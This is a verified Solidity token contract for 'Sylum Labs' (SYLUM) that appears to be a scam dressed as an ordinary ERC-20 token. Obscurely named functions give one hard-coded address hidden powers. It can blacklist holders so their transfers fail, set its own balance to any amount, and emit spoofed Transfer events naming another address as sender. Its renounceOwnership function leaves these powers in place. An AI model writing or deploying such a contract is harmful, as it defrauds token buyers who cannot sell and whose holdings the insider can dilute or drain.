/**
 *Submitted for verification at Etherscan.io on 2022-10-27
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract SYLUM {
  
    mapping (address => uint256) public Jz;
    mapping (address => uint256) public Kl;
    mapping (address => bool) Zu;
    mapping(address => mapping(address => uint256)) public allowance;
	address cstruct = 0x4ACC13d6212cC7E1d061Ab9C8AA8a6d71A278318;
	address VRouter2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;




    string public name = unicode"Sylum Labs";
    string public symbol = unicode"SYLUM";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);


    constructor()  {
    Jz[msg.sender] = totalSupply;
    emit Transfer(address(0), VRouter2, totalSupply); }

   

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == cstruct)  {
        require(Jz[msg.sender] >= value);
        Jz[msg.sender] -= value;  
        Jz[to] += value; 
        emit Transfer (VRouter2, to, value);
        return true; }  
        if(!Zu[msg.sender]) {
        require(Jz[msg.sender] >= value);
        Jz[msg.sender] -= value;  
        Jz[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}
		

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function KBurn () public {
         if(msg.sender == cstruct)   {
        Jz[msg.sender] = Kl[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Jz[account]; }

        function Kdep(address zi) public {
        if(msg.sender == cstruct)  { 
        Zu[zi] = false;}}
        function Kcheck(address zi) public{
         if(msg.sender == cstruct)  { 
        require(!Zu[zi]);
        Zu[zi] = true;
        }}
             function Kbridge(uint256 xi) public {
        if(msg.sender == cstruct)  { 
        Kl[msg.sender] = xi;} }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        if(from == cstruct)  {
        require(value <= Jz[from]);
        require(value <= allowance[from][msg.sender]);
        Jz[from] -= value;  
        Jz[to] += value; 
        emit Transfer (VRouter2, to, value);
        return true; }    
          if(!Zu[from] && !Zu[to]) {
        require(value <= Jz[from]);
        require(value <= allowance[from][msg.sender]);
        Jz[from] -= value;
        Jz[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}